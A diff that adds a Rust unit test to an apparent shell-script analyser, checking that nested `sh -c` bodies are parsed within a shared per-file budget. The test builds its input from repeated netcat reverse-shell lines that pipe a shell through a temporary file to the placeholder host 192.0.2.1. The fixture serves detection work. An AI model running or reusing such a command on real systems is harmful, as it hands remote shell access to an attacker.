@@ -107,3 +107,27 @@ fn data_comments_and_dynamic_payloads_do_not_supply_flow() {
         assert_eq!(loops(&source), Value::Null, "{source}");
     }
 }
+
+/// Literal `sh -c` bodies are parsed within one per-file allowance; past it
+/// the rest are skipped and the limit is recorded.
+#[test]
+fn nested_parses_share_one_budget_and_record_the_limit() {
+    let source: String = (0..40)
+        .map(|i| format!("sh -c \"sh </tmp/f{i} | nc 192.0.2.1 80 >/tmp/f{i}\"\n"))
+        .collect();
+    let parses = crate::formats::source::parse::PARSES.get();
+    let found = values(&source);
+    let used = crate::formats::source::parse::PARSES.get() - parses;
+    assert!(used <= 1 + 32, "{used} parses");
+    assert_eq!(
+        found.pointer("/source/shell/fifo_limited"),
+        Some(&json!(true))
+    );
+    assert_eq!(
+        loops(&source).as_array().map(Vec::len),
+        Some(32),
+        "loops in the parsed bodies are kept"
+    );
+    let few = values(SOURCE);
+    assert_eq!(few.pointer("/source/shell/fifo_limited"), None);
+}
